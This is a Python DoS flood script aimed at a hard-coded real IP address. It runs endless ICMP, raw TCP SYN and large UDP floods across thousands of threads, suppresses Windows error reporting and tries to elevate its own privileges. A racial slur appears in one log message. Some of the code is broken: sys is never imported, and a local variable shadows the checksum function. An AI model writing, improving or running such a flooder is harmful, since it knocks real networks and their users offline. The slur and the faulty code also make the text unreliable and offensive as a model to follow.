import socket
import os
import struct
import logging
import concurrent.futures
import threading
import psutil
import ctypes
import platform
import random
import time


logging.basicConfig(level=logging.WARNING, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


def disable_windows_error_reporting():
    if platform.system().lower() == "windows":
        try:
            ctypes.windll.kernel32.SetErrorMode(0x0002)  
            ctypes.windll.kernel32.SetProcessPriorityBoost(ctypes.windll.kernel32.GetCurrentProcess(), True)
            logger.info("Windows Error Reporting disabled successfully.")
        except Exception as e:
            logger.warning(f"Failed to disable Windows Error Reporting: {e}")

def checksum(source_string):
    count_to = (len(source_string) // 2) * 2
    total = 0
    count = 0

    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        total += this_val
        total &= 0xffffffff
        count += 2

    if count_to < len(source_string):
        total += source_string[len(source_string) - 1]
        total &= 0xffffffff

    total = (total >> 16) + (total & 0xffff)
    total += (total >> 16)
    answer = ~total
    answer &= 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def icmp_permission_bypass():
    try:#tle credit thaks for my friends 
        if platform.system().lower() == "windows":
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, None, None, 1)
            logger.info("TRYING ")
        else:
            logger.info("NOT REQUIRED")
    except Exception as e:
        logger.warning(f"FAILDE: {e}")


def send_icmp_packet(ipa, data, icmp_id, icmp_seq):
    try:
        sock_icmp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
        sock_icmp.setblocking(False)
        header = struct.pack("bbHHh", 8, 0, 0, icmp_id, icmp_seq)
        my_checksum = checksum(header + data)
        header = struct.pack("bbHHh", 8, 0, socket.htons(my_checksum), icmp_id, icmp_seq)
        packet = header + data

        while True:
            try:
                sock_icmp.sendto(packet, (ipa, 0))
            except socket.error as e:
                if e.errno != 10035: 
                    raise
            except PermissionError:
                icmp_permission_bypass()
            except Exception as e:
                logger.error(f"Sending ICMP PACKET N1gAS: {e}")
                break
    finally:
        sock_icmp.close()

def send_tcp_syn(ipa, port):
    try:
        sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        sock_tcp.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock_tcp.setblocking(False)
        src_port = random.randint(443, 5553)
        seq_number = random.randint(0, 4294967295)
        ack_number = 0
        data_offset = 5 
        tcp_flags = 2 
        window = socket.htons(65535)
        checksum = 0
        urgent_ptr = 0
        offset_res = (data_offset << 4) + 0
        tcp_header = struct.pack('!HHLLBBHHH', src_port, port, seq_number, ack_number, offset_res, tcp_flags, window, checksum, urgent_ptr)
        pseudo_header = struct.pack('!4s4sBBH', socket.inet_aton("192.168.1.1"), socket.inet_aton(ipa), 0, socket.IPPROTO_TCP, len(tcp_header))
        psh = pseudo_header + tcp_header
        tcp_checksum = checksum(psh)
        tcp_header = struct.pack('!HHLLBBH', src_port, port, seq_number, ack_number, offset_res, tcp_flags, window) + struct.pack('H', tcp_checksum) + struct.pack('!H', urgent_ptr)

        while True:
            try:
                sock_tcp.sendto(tcp_header, (ipa, port))
            except socket.error as e:
                if e.errno != 10035:
                    raise
    finally:
        sock_tcp.close()


def send_udp_packet(ipa, port, data):
    try:
        sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while True:
            try:
                sock_udp.sendto(data, (ipa, port))
            except socket.error as e:
                if e.errno != 10035:
                    raise
    finally:
        sock_udp.close()

def chain_attacks(ipa, data):
    ports = [443]
    random.shuffle(ports)
    for port in ports:
        threading.Thread(target=send_tcp_syn, args=(ipa, port)).start()
        threading.Thread(target=send_udp_packet, args=(ipa, port, data)).start()

def complex_icmp_attack(targets, data):
    logger.info(f" {len(targets)} ")
    max_workers = psutil.cpu_count(logical=True) * 2000

    def attack_target(ipa):
        icmp_id = threading.get_ident() & 0xFFFF
        icmp_seq = 1
        send_icmp_packet(ipa, data, icmp_id, icmp_seq)
        chain_attacks(ipa, data)  

    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(attack_target, ipa) for ipa in targets]
        concurrent.futures.wait(futures)

def prepare_attack():
    disable_windows_error_reporting()
    data = os.urandom(65507)
    targets = ["103.23.199.207"]  
    return targets, data

def start_icmp_attack():
    targets, data = prepare_attack()
    if not targets:
        logger.error("?")
    else:
        try:
            complex_icmp_attack(targets, data)
        finally:
            logger.info("FinishEd 0/4 TRACEOUT")

if __name__ == "__main__":
    start_icmp_attack()
